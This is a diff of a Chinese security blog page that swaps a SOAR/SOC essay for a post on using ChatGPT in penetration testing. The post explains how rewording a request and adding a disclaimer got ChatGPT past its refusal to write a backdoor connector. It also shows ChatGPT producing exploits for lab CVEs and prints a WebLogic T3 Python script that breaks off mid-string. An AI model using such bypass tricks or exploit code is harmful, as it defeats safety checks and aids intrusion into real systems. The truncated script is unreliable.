@@ -3,24 +3,42 @@
 <head>
     <meta charset="utf-8">
     
-    <title>SOAR，SOC和安全 | CiaoFox</title>
+    <title>奇点遗民————关于chatgpt以及其类似AI在渗透中的应用与思考 | CiaoFox</title>
     
     
-        <meta name="keywords" content="安全运营" />
+        <meta name="keywords" content="安全运营,未完成" />
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="本文描述了在工作中接触到SOAR平台后关于SOAR平台的一些粗浅思考，主要为SOAR、SOC、SIEM等安全相关内容。">
+    <meta name="description" content="22年与23年交界时候chatgpt以席卷一切的姿态降临这个世界，事实上整个22年下半年AI这个词的出现频率都在提高，AI绘画，chatgpt...我能感受到某些东西出现在地平线上，但我并不确定它们是好是坏。标题是我最近在看的刘宇昆的短篇故事，我觉得这个名字很适合在未来回顾这篇文章。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SOAR，SOC和安全">
-<meta property="og:url" content="http://ciaofox.me/2021/08/25/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/SOAR%EF%BC%8CSOC%E5%92%8C%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:title" content="奇点遗民————关于chatgpt以及其类似AI在渗透中的应用与思考">
+<meta property="og:url" content="http://ciaofox.me/2023/02/16/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/%E5%A5%87%E7%82%B9%E9%81%97%E6%B0%91%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8Echatgpt%E4%BB%A5%E5%8F%8A%E5%85%B6%E7%B1%BB%E4%BC%BCAI%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E4%B8%8E%E6%80%9D%E8%80%83/index.html">
 <meta property="og:site_name" content="CiaoFox">
-<meta property="og:description" content="本文描述了在工作中接触到SOAR平台后关于SOAR平台的一些粗浅思考，主要为SOAR、SOC、SIEM等安全相关内容。">
+<meta property="og:description" content="22年与23年交界时候chatgpt以席卷一切的姿态降临这个世界，事实上整个22年下半年AI这个词的出现频率都在提高，AI绘画，chatgpt...我能感受到某些东西出现在地平线上，但我并不确定它们是好是坏。标题是我最近在看的刘宇昆的短篇故事，我觉得这个名字很适合在未来回顾这篇文章。">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-08-25T02:19:12.000Z">
-<meta property="article:modified_time" content="2022-03-15T09:25:40.000Z">
+<meta property="og:image" content="https://s2.loli.net/2023/02/17/pmEiOc7LvkHI5bR.png">
+<meta property="og:image" content="https://s2.loli.net/2023/02/17/TQXCFxeJGUhi12t.png">
+<meta property="og:image" content="https://s2.loli.net/2023/02/17/JY217ecMRgCHsx4.png">
+<meta property="og:image" content="https://s2.loli.net/2023/02/17/RrYTKjS9C4Lfy7B.png">
+<meta property="og:image" content="https://s2.loli.net/2023/02/17/NJSxdi4MPbymh3Z.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/02/7KC2tga1RPnboZc.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/02/O5VxjQDfXoWZw72.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/05/fWrVwqyvotC6JD5.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/05/QYEmJ1CFK2nTRxN.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/05/FeSjMxVkRTAo73P.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/05/AJrPneRNC8qB1ma.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/05/udyqwAS2HYmGKNr.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/05/QEhJq9lpTBGkR6u.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/05/9C4vfVNhYQwJR3x.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/05/1THpWaikY57s9dy.png">
+<meta property="og:image" content="https://s2.loli.net/2023/03/05/vmYjSQ9JHLhDuPa.png">
+<meta property="article:published_time" content="2023-02-16T12:18:11.000Z">
+<meta property="article:modified_time" content="2023-03-12T14:09:11.000Z">
 <meta property="article:author" content="CiaoFox">
 <meta property="article:tag" content="安全运营">
+<meta property="article:tag" content="未完成">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/02/17/pmEiOc7LvkHI5bR.png">
     
 
     
@@ -287,7 +305,7 @@
                             &nbsp;
                             安全运营
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file active"><a href="/2021/08/25/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/SOAR%EF%BC%8CSOC%E5%92%8C%E5%AE%89%E5%85%A8/">SOAR，SOC和安全</a></li>  <li class="file"><a href="/2022/05/20/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/%E5%B0%91%E6%95%B0%E6%B4%BE%E6%8A%A5%E5%91%8A-%E5%85%B3%E4%BA%8E%E5%9B%BA%E4%BB%B6%EF%BC%8C%E7%AD%89%E4%BF%9D%E4%B8%8E%E5%AE%89%E5%85%A8/">少数派报告-关于固件，等保与安全（未完待续）</a></li>  <li class="file"><a href="/2023/02/16/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/%E5%A5%87%E7%82%B9%E9%81%97%E6%B0%91%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8Echatgpt%E4%BB%A5%E5%8F%8A%E5%85%B6%E7%B1%BB%E4%BC%BCAI%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E4%B8%8E%E6%80%9D%E8%80%83/">奇点遗民————关于chatgpt以及其类似AI在渗透中的应用与思考</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/08/25/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/SOAR%EF%BC%8CSOC%E5%92%8C%E5%AE%89%E5%85%A8/">SOAR，SOC和安全</a></li>  <li class="file"><a href="/2022/05/20/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/%E5%B0%91%E6%95%B0%E6%B4%BE%E6%8A%A5%E5%91%8A-%E5%85%B3%E4%BA%8E%E5%9B%BA%E4%BB%B6%EF%BC%8C%E7%AD%89%E4%BF%9D%E4%B8%8E%E5%AE%89%E5%85%A8/">少数派报告-关于固件，等保与安全（未完待续）</a></li>  <li class="file active"><a href="/2023/02/16/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/%E5%A5%87%E7%82%B9%E9%81%97%E6%B0%91%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8Echatgpt%E4%BB%A5%E5%8F%8A%E5%85%B6%E7%B1%BB%E4%BC%BCAI%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E4%B8%8E%E6%80%9D%E8%80%83/">奇点遗民————关于chatgpt以及其类似AI在渗透中的应用与思考</a></li>  </ul> 
                     </li> 
                     
                     <li class="directory">
@@ -378,7 +396,7 @@
     <div id="toTop" class="fa fa-angle-up"></div>
 </aside>
             
-            <section id="main"><article id="post-安全运营/SOAR，SOC和安全" class="article article-type-post" itemscope itemprop="blogPost">
+            <section id="main"><article id="post-安全运营/奇点遗民————关于chatgpt以及其类似AI在渗透中的应用与思考" class="article article-type-post" itemscope itemprop="blogPost">
     <div class="article-inner">
         
         
@@ -394,14 +412,14 @@
                         
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link-link" href="/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/" rel="tag">安全运营</a>
+        <a class="tag-link-link" href="/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/" rel="tag">安全运营</a>, <a class="tag-link-link" href="/tags/%E6%9C%AA%E5%AE%8C%E6%88%90/" rel="tag">未完成</a>
     </div>
 
                         
     <div class="article-date">
         <i class="fa fa-calendar"></i>
-        <a href="/2021/08/25/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/SOAR%EF%BC%8CSOC%E5%92%8C%E5%AE%89%E5%85%A8/">
-            <time datetime="2021-08-25T02:19:12.000Z" itemprop="datePublished">2021-08-25</time>
+        <a href="/2023/02/16/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/%E5%A5%87%E7%82%B9%E9%81%97%E6%B0%91%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8Echatgpt%E4%BB%A5%E5%8F%8A%E5%85%B6%E7%B1%BB%E4%BC%BCAI%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%E4%B8%8E%E6%80%9D%E8%80%83/">
+            <time datetime="2023-02-16T12:18:11.000Z" itemprop="datePublished">2023-02-16</time>
         </a>
     </div>
 
@@ -416,7 +434,7 @@
                 
     
         <h1 class="article-title" itemprop="name">
-            SOAR，SOC和安全
+            奇点遗民————关于chatgpt以及其类似AI在渗透中的应用与思考
         </h1>
     
 
@@ -429,105 +447,70 @@
             
         
         
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>毕业之后因为疫情找不到好的渗透岗，一度考虑去做安全运维，最后机缘巧合去了一家安全集成公司，什么都做，每天都感觉在打杂。这个过程很痛苦，但是也让我对安全运营有了一定的了解和思考。而后续在一些hw和重保中，我对于安全运维也开始有一些更进一步的看法了。</p>
-<p>当我看到SOAR的概念时，很自然地，我将其与SOC平台进行了比较。它们之间有一条很细微的区分界限，这条线很难把握但又确实存在。我希望通过这篇文章对SOAR和SOC进行一个稍微深入一些的探究。</p>
-<h2 id="从源头探究起：什么是SOAR（Security-Orchestration-Automation-and-Response）？"><a href="#从源头探究起：什么是SOAR（Security-Orchestration-Automation-and-Response）？" class="headerlink" title="从源头探究起：什么是SOAR（Security Orchestration, Automation and Response）？"></a>从源头探究起：什么是SOAR（Security Orchestration, Automation and Response）？</h2><p>从各种资料中我们不难发现SOAR的定义最初在2017年由Gartner创造，<a target="_blank" rel="noopener" href="https://www.gartner.com/en/information-technology/glossary/security-orchestration-automation-response-soar">它的词条定义</a>是：</p>
-<blockquote>
-<p>SOAR refers to technologies that enable organizations to collect inputs monitored by the security operations team. For example, alerts from the SIEM system and other security technologies — where incident analysis and triage can be performed by leveraging a combination of human and machine power — help define, prioritize and drive standardized incident response activities. SOAR tools allow an organization to define incident analysis and response procedures in a digital workflow format.</p>
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>几个月前，关于chatgpt最多的问题是：“什么是chatgpt”，我在那时候没有动笔。而现在，关于chatgpt最多的问题是：“我们能用chatgpt做什么”。我想这个问题值得专门写一篇blog来讨论。当然，本文的重点不是chatgpt与改作业写论文发菜谱以及如何扮演一个猫娘…而是渗透。</p>
+<p>注：本文中大部分交互内容都是中文，因为这篇blog中我会使用大量的诱导性语句来迫使chatgpt输出我想要内容，而中文作为我的母语我可以更流畅地把握对话。也许你可以用英文来交互以获得更好的回答，但我想本质内容不会有什么改变的。</p>
+<h1 id="骗过chatgpt的道德和法律限制"><a href="#骗过chatgpt的道德和法律限制" class="headerlink" title="骗过chatgpt的道德和法律限制"></a>骗过chatgpt的道德和法律限制</h1><p><strong>chatgpt并非一成不变的。</strong></p>
+<p>在chatgpt刚出现时候它几乎没有任何限制，你可以诱导甚至直接要求它说出种族歧视言论，进行色情对话或是<a target="_blank" rel="noopener" href="https://www.darkreading.com/attacks-breaches/attackers-are-already-exploiting-chatgpt-to-write-malicious-code">编写恶意代码</a>。这些大多哗众取宠的内容是其相关讨论中最外围但是也最吸引普通人目光的组成部分。但是在大概2个月之后，它<a target="_blank" rel="noopener" href="https://www.techrepublic.com/article/cybersecurity-blade-chatgpt-can-cut-both-ways/amp/">逐渐堵上了这些路</a>。现在的chatgpt依照其<a target="_blank" rel="noopener" href="https://platform.openai.com/docs/usage-policies/disallowed-usage">使用政策</a>会自动拒绝某些对话请求。但很显然，这些限制很容易翻越。</p>
+<p>基于渗透技术的两面性，就如中国菜刀本身是作为网站后台管理工具反倒被用作后门连接工具一样，计算机无法判断一段程序会被运用在什么地方。当它创造一段自动触发的程序时它无法判断该程序是用作执剑人系统的自动按钮还是用在智能窗帘上。于是我们可以利用这些语言的小陷阱来迂回达成我们的目的。</p>
+<p>下面我们来举一个例子：</p>
+<p><img src="https://s2.loli.net/2023/02/17/pmEiOc7LvkHI5bR.png"></p>
+<p>当我第一次提问时候，我直白地告诉它我需要一个后门的连接器，因为我预计到必然被拒绝所以我也没用心去描述技术要求。而结果也很明显，chatgpt果断地拒绝了我的请求。之后我尝试了多次，只要我提到这是一个“后门连接器”，它就会明确拒绝该请求。但只要稍微迂回一下，马奇诺防线就会失去作用。</p>
+<p>同样需要注意的是：我第二次要求的后半部分，免责声明部分并非无关紧要。它决定了chatgpt对其的道德和法律判定。如果去掉的话，chatgpt依然会拒绝我的要求。</p>
+<p><img src="https://s2.loli.net/2023/02/17/TQXCFxeJGUhi12t.png"></p>
+<h1 id="who-I-am-关于prompt"><a href="#who-I-am-关于prompt" class="headerlink" title="who I am? (关于prompt)"></a>who I am? (关于prompt)</h1><p>世界上最本质的问题是：我是谁，我在哪，我要做什么。虽然chatgpt可以在不知道这些问题的情况下回答你的所有问题，但你肯定会希望它以一个你想要的身份对每个问题给出专业回答。实际上，除了告知chatgpt它所扮演的角色之外，我们还可以通过例如定义受众，格式化输出等方式来调整它输出的答案内容与格式。而这些修改的条件，我们称之为prompt（感觉中文里找不到对应的词）。</p>
+<p>根据<a target="_blank" rel="noopener" href="https://the-decoder.com/chatgpt-guide-prompt-strategies/#chained-prompting">ChatGPT Guide: 7 prompt strategies for better output</a>，我们可以从里面学习到一些利用prompt来快速结构化输出并充分利用chatgpt潜能的方式。<del>而不是无尽地在里面问一堆政治问题和观点看法然后发知乎和公众号来博眼球与流量。</del> 在这篇文章中，我们更多是以对话的形式来与chatgpt交流并探讨其在渗透中的作用，所以参考文中的第一个技巧，<a target="_blank" rel="noopener" href="https://the-decoder.com/chatgpt-guide-prompt-strategies/#define-chatgpt%E2%80%99s-role">定义chatgpt的角色</a>非常重要。</p>
+<p>从逻辑性来说，我们无法告诉它“我希望你扮演一个面试官”或是“我希望你扮演一个银河系搭车客指南”，这样的要求太过于宽泛。prompt是围栏，我们应该尽可能地利用它将chatgpt进行限制，</p>
+<details> <summary>顺便说一下，让它扮猫娘以及类似的角色</summary>
+效果如图
+
+<p><img src="https://s2.loli.net/2023/02/17/JY217ecMRgCHsx4.png"></p>
+<p>但是当你稍微越界时候，它会标红并提示无法满足要求。主要越界内容判定是基于其<a target="_blank" rel="noopener" href="https://platform.openai.com/docs/usage-policies/disallowed-usage">使用政策</a></p>
+<p><img src="https://s2.loli.net/2023/02/17/RrYTKjS9C4Lfy7B.png"></p>
+<p>如果我们让其扮演稍微合理一些的对象时它不会拒绝：</p>
+<p><img src="https://s2.loli.net/2023/02/17/NJSxdi4MPbymh3Z.png"></p>
+<p>附：<a target="_blank" rel="noopener" href="https://onetwo.ren/ChatGPT-Magic-Chat/#Index:Index">催眠手册</a></p>
+</details>
+
+<h1 id="渗透百科全书"><a href="#渗透百科全书" class="headerlink" title="渗透百科全书"></a>渗透百科全书</h1><p>得益于其强大的检索能力与整合能力，我们可以略过“花费巨量时间换三个不同的搜索引擎排除一万个csdn链接找到3篇blog漏洞复现文章其中只有一个靠谱的”这个过程。我们以漏洞复现或是CTF靶场为例展示一下chatgpt在渗透方面的强大能力：</p>
+<p>靶场：<a target="_blank" rel="noopener" href="https://voluvulfocus.cn/">https://voluvulfocus.cn/</a></p>
+<p>因为网络问题，我们尽可能地使用带有writeup的靶场进行验证，而不是实际进行验证（vulfocus的网络比我直连htb还痛苦）。</p>
+<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>本次使用的靶场为wordpress 文件下载 （CVE-2019-19985）</p>
+<p><img src="https://s2.loli.net/2023/03/02/7KC2tga1RPnboZc.png"></p>
+<p>vulfocus给的介绍实在是太少了，我们依靠这些信息很难判断出漏洞的具体情况，好在它给了漏洞编号，我们将该漏洞丢到chatgpt问问：</p>
+<p><img src="https://s2.loli.net/2023/03/02/O5VxjQDfXoWZw72.png"></p>
+<p>chatgpt很直接地给出了如何构造请求来读取文件。但是新的问题出现了，该请求并没有产生该产生的效果。于是我找到了<a target="_blank" rel="noopener" href="https://github.com/RandomRobbieBF/wordpress-exploits">该漏洞的POC</a>，并且再询问一次。</p>
+<p><img src="https://s2.loli.net/2023/03/05/fWrVwqyvotC6JD5.png"></p>
+<p>这次给出的请求和网上的该漏洞的POC是一致的。</p>
+<p><img src="https://s2.loli.net/2023/03/05/QYEmJ1CFK2nTRxN.png"></p>
+<p>迫于网络问题，我没法再复现这个漏洞，只能认为其可利用。</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>本次使用的靶场为xstream 反序列化 （CVE-2021-39144）</p>
+<p>简单介绍：</p>
+<p><img src="https://s2.loli.net/2023/03/05/FeSjMxVkRTAo73P.png"></p>
+<p>如果我想要直接获取root权限：</p>
+<p><img src="https://s2.loli.net/2023/03/05/AJrPneRNC8qB1ma.png"></p>
+<p>如果我想要直接获取flag文件：</p>
+<p><img src="https://s2.loli.net/2023/03/05/udyqwAS2HYmGKNr.png"></p>
+<p>让我们比对一下writeup：</p>
+<p><img src="https://s2.loli.net/2023/03/05/QEhJq9lpTBGkR6u.png"></p>
+<p>这看起来基本一致，可能有能够优化的地方，但我们决定在这里终止。chatgpt证明了只要给出好的文本提示，它就能够提供可以运行的恶意代码。</p>
+<h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>本次使用的靶场为weblogic 未授权访问 （CVE-2018-3246）</p>
+<p>简单介绍：</p>
+<p><img src="https://s2.loli.net/2023/03/05/9C4vfVNhYQwJR3x.png"></p>
+<p>和voluvulfocus简介基本一致:</p>
+<p><img src="https://s2.loli.net/2023/03/05/1THpWaikY57s9dy.png"></p>
+<p>利用方式：</p>
+<p><img src="https://s2.loli.net/2023/03/05/vmYjSQ9JHLhDuPa.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">host = &#x27;target_host&#x27;</span><br><span class="line">port = 7001</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">header = &#x27;t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://localhost:7001\n\n&#x27;</span><br><span class="line">payload = &#x27;47494f50010200020000000400000003000000000000000131302e31302e31302e31310000090c0000000b4a4d7856616c75650000000000000000000000000000000000000000000000000000000000000000000000000000000baba040000000001020000000000000a0000000000000002000000004f4a4d4e31687474700005454e565f4c4f43414c2d4441544100000100000000000000000a00000032000000020000000c31302e31302e31302e3131000000000000000000000000000000000000&#x27;</span><br><span class="line"></span><br><span class="line">payload = binascii.a2b_hex(payload)</span><br><span class="line">pkt = header + str(len(payload)).rjust(8, &#x27;0&#x27;) + payload</span><br><span class="line"></span><br><span class="line">sock.send(pkt)</span><br><span class="line"></span><br><span class="line">resp = sock.recv(1024)</span><br><span class="line">if &#x27;HELO&#x27; in resp:</span><br><span class="line">    print &#x27;[+] T3 protocol is enabled on the target&#x27;</span><br><span class="line">else:</span><br><span class="line">    print &#x27;[-] T3 protocol is not enabled on the target&#x27;</span><br><span class="line">    sock.close()</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">header = &#x27;t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://localhost:7001\n\n&#x27;</span><br><span class="line">payload = &#x27;47494f500102000c0000000400000003000000000000000f31302e31302e31302e3131000000&#x27; + \</span><br><span class="line">          &#x27;090c0000000b4a4d7856616c7565000000000000000000000000000000000000000000000000&#x27; + \</span><br><span class="line">          &#x27;0000000000000000000000000000000000000000000000baba04000000000c00000000000000&#x27; + \</span><br><span class="line">          &#x27;020000000000000a0000000000000002000000004f4a4d4e31687474700005454e565f4c4f43</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>chatgpt又一次证明了只要有好的文本提示和漏洞细节，它就可以生成可用的漏洞利用代码。</p>
+<h1 id="对chatgpt本身的渗透"><a href="#对chatgpt本身的渗透" class="headerlink" title="对chatgpt本身的渗透"></a>对chatgpt本身的渗透</h1><blockquote>
+<p>Never trust user input.</p>
+<p>Data must be validated as it crosses the boundary between untrusted and trusted environments.</p>
 </blockquote>
-<blockquote>
-<p>SOAR指的是一种可以让组织收集由安全运营团队所监控的输入的技术。例如，来自SIEM系统和其他安全技术的警报有助于定义、确定优先级并驱动标准化的事件响应活动，在这些安全技术中，可以利用人力和机器的力量来执行事件分析和分类。SOAR工具允许组织以数字工作流格式定义事件分析和响应程序。<br>（机翻）</p>
-</blockquote>
-<p>可以看出这是一个很空洞而又宽泛的概念，后续Gartner又对其进行了不少的修补，最重要的是两篇报告：<br><a target="_blank" rel="noopener" href="https://www.gartner.com/en/documents/3860563" title="这篇文章需要成为Gartner的客户才能看，而且我没找到别的可以看的方式">Preparing Your Security Operations for Orchestration and Automation Tools</a><br><a target="_blank" rel="noopener" href="https://www.gartner.com/en/documents/3990720" title="这篇我倒是找到了可以看的地方">Market Guide for Security Orchestration, Automation and Response Solutions
-</a></p>
-<p>第一篇文章对SOAR进行了很详细的定义与指导，但是我没有找到可以免费看这篇文档的地方，所以这里我只能放出它的目录来:</p>
-<blockquote>
-<p>Analysis</p>
-<ul>
-<li>Defining SOAR</li>
-<li>SOAR Drivers and Enablers<ul>
-<li>SOAR for Security Staff Productivity</li>
-<li>Additional SOAR Drivers</li>
-<li>SOAR Enablers</li>
-</ul>
-</li>
-<li>SOAR Use Cases<ul>
-<li>Detection and Triage Use Cases</li>
-<li>Incident Response Use Cases</li>
-<li>Threat Intelligence Use Cases</li>
-<li>Detailed Use Case Example: Phishing Email Handling</li>
-</ul>
-</li>
-<li>SOAR Technologies in Depth<ul>
-<li>Workflow and Collaboration Engine</li>
-<li>Case and Ticket Management</li>
-<li>Orchestration and Automation</li>
-<li>Threat Intelligence Management</li>
-<li>Other Components and Capabilities</li>
-</ul>
-</li>
-<li>SOAR Architecture<ul>
-<li>Differences Between Existing SOAR Tool Categories</li>
-</ul>
-</li>
-<li>SOAR Future</li>
-<li>Strengths</li>
-<li>Weaknesses  </li>
-</ul>
-<p>Guidance</p>
-<ul>
-<li>Decide on the Need and Readiness for SOAR</li>
-<li>Build a Business Case for SOAR</li>
-<li>Select the Right SOAR Tool for You</li>
-<li>Test the SOAR Tools</li>
-<li>Align Skills Needed for SOAR Success</li>
-<li>Deploy the SOAR Technology</li>
-<li>Use SOAR Tools Effectively</li>
-<li>Expand and Evolve Your SOAR Deployment</li>
-</ul>
-<p>The Details<br>Gartner Recommended Reading</p>
-</blockquote>
-<p>从这里我们可以看出这篇报告已经涵盖了整个SOAR的定义、应用场景和使用案例，我们可以认为这篇报告确实配得上它自称的”our amazing SOAR paper”。所以我也对它非常好奇，如果有谁可以分享给我满足一下好奇心，那可真是非常感谢了。</p>
-<p>再参考一些侧面描述SOAR的文章，如：</p>
-<p><a target="_blank" rel="noopener" href="https://securityintelligence.com/posts/whats-new-2020-gartner-market-guide-soar-solutions/">https://securityintelligence.com/posts/whats-new-2020-gartner-market-guide-soar-solutions/</a><br><a target="_blank" rel="noopener" href="https://www.dflabs.com/resources/blog/gartner-soar-magic-quadrant-the-best-of-incman-soar-is-yet-to-come/">https://www.dflabs.com/resources/blog/gartner-soar-magic-quadrant-the-best-of-incman-soar-is-yet-to-come/</a><br><a target="_blank" rel="noopener" href="https://blog.technologent.com/gartner-soar-model-future-it-security">https://blog.technologent.com/gartner-soar-model-future-it-security</a></p>
-<p>现在我们可以用自己的话来对其进行一个描述了：SOAR平台是以workflow（工作流）和playbook（剧本）为核心的安全运营中心，它更强调了自动化判断报警级别的作用，并以playbook为核心设置了自动化流程。</p>
-<p>从这个意义上我们可以发现SOAR的概念非常眼熟，不管是SIEM还是SOC都与之有一些相似性，但是又各有各强调的点。这也是安全方面概念的一些难点：几乎没有突破性的进展，更多是面对某些情况的修补和适配。（这里可以多说几句，最近几年安全方面强推零信任，安全设备换着名字翻新，而实际上几乎没有技术性的突破。这感觉真是太荒谬了，一方面是red team的技术和工具不断革新换代，利用点从框架漏洞转向侧信道再跳到代码审计上的0day漏洞，利用难度逐渐下降，攻击点越来越多。而blue team呢？不断纠结几个小的点的更新，从零信任到蜜罐到SOAR，不断缝缝补补最新的漏洞，俨然一副”安全的大厦已经建成，之后只需要小修小补”的姿态，最后甚至开始从制度上收紧，我不得不怀疑安全方向未来的发展。</p>
-<h2 id="让我们更进一步，SOAR和SIEM还有SOC之间有什么关联呢？"><a href="#让我们更进一步，SOAR和SIEM还有SOC之间有什么关联呢？" class="headerlink" title="让我们更进一步，SOAR和SIEM还有SOC之间有什么关联呢？"></a>让我们更进一步，SOAR和SIEM还有SOC之间有什么关联呢？</h2><p>那么让我们先来看一下，什么是SIEM，什么是SOC：</p>
-<blockquote>
-<p>SIEM (安全信息和事件管理)是软件和服务的组合，是SIM（安全信息管理）和SEM（安全事件管理）的融合体。两者的区别在 于SEM侧重于实时监控和事件处理方面，SIM侧重历史日志分析和取证方面。SIEM为来自企业和组织中所有IT资源（包括网络、系统和应用）产生的安全信息（包括日志、告警等）进行统一的实时监控、历史分析，对来自外部的攻击行为和内部的违规、误操作行为进行监控、审计分析、调查取证、出具各种报表报告，实现IT资源合规性管理的目标，同时提升企业和组织的安全运营、威胁管理和应急响应能力。</p>
-</blockquote>
-<blockquote>
-<p>SOC平台，网络安全管理平台。<br>提供集中、统一、可视化的安全信息管理，通过实时采集各种安全信息，动态进行安全信息关联分析与风险评估，实现安全事件的快速跟踪、定位和应急响应。<br>从监控、审计、风险和运维四个维度建立起来的一套可度量的统一业务支撑平台。</p>
-</blockquote>
-<p>从中可以看出，如果以中国的安全设备习惯来说，SIEM更多地接近<strong>日志审计平台</strong>，各大安全厂商都有这个产品，集中所有的日志对其进行分析（一般是分布式部署），同时可以解决掉等保的日志相关的合规要求。在使用中我用过启明星辰的泰合日志审计平台和360的日志审计中心，还有诸如graylog一类的开源日志平台。它们的主要功能很相似：从各个设备（不局限于安全设备）上发送日志和告警到自己这里，对其进行解析，归纳（有些可以分析），资产发现。一般不会具有响应动作。</p>
-<p>而SOC平台，更多地是作为一个集中化的处理中心。它从日志审计中心中读取流量，然后进行分析，归纳，总结。以国内的产品来说，大部分厂商的态势感知平台都是为了这个目的而生的——————一个可以产生警报，调取日志，查询入侵路径的运营中心。这个中心需要部分安全人员值守，这也就是安全运维主要驻场的地方了。</p>
-<p><strong>而SOAR，更多地是作为一个SOC的+1版本，为了解决企业使用SOC平台方案后需要大量人力值守的情况，于是自动化就变成了一个新的需求点，SOAR也是为了解决这个需求而应运而生的。SOAR从SIEM中提取日志（是的SOC平台也需要从SIEM中提取日志），如果日志触发了SOAR的剧本的开始 条件，就会开始执行这个剧本。举例来说，某个xxx设备的xxx告警日志会触发我设定好的告警剧本，那么当SOAR平台收到这个告警日志，就会开始执行剧本的后续环节，例如发送警报到邮箱或是钉钉提醒。</strong></p>
-<h2 id="短暂休息一下，让我们聊聊目前的安全现状。"><a href="#短暂休息一下，让我们聊聊目前的安全现状。" class="headerlink" title="短暂休息一下，让我们聊聊目前的安全现状。"></a>短暂休息一下，让我们聊聊目前的安全现状。</h2><p>在几年的安全工作中也大概地理解到了安全工作的尴尬。在过去我能想到的无非是：安全本身并不产生收益，但是却会消耗资源，所以各大公司都不愿意加大安全预算。</p>
-<p>从现在的角度看起来这种想法并不能算错，但是委实太粗浅了一些。企业在安全方面的投资在我看来更像是一种”降低受灾概率”的存在。安全设备并不像备份设备一样能够为灾难或是数据丢失兜底，所有安全厂商都会告诉公司，你的系统有很多安全风险，只要购买了我们的xxxx，公司的网络系统就安全了。但是事实是，即使你购买了全套的安全设备，从防火墙到waf到日志审计到防病毒到态势感知到蜜罐…全部上上去，你的系统依然有可能被正面攻破/迂回潜入，你的数据依然有可能会被窃取。</p>
-<p>那么企业在这样的环境下，又凭什么花费大力气在安全上呢？</p>
-<p>安全建设从来都需要”由上而下”的力量作为第一推动力，否则企业不可能付出大的投入去做安全。而国内常见的安全现状是什么呢：甲方公司出于合规性的要求去做安全建设；甲方公司领导被乙方洗脑决定推动安全建设来解决自身的安全问题。后者当然比前者要来得更主动，更有决心，更有效果。但是在工作中我见过的后者公司，一只手都能数的过来。</p>
-<p>目前的国内公司的安全情况可以从安全投入来讲粗浅地分为三类：</p>
-<ul>
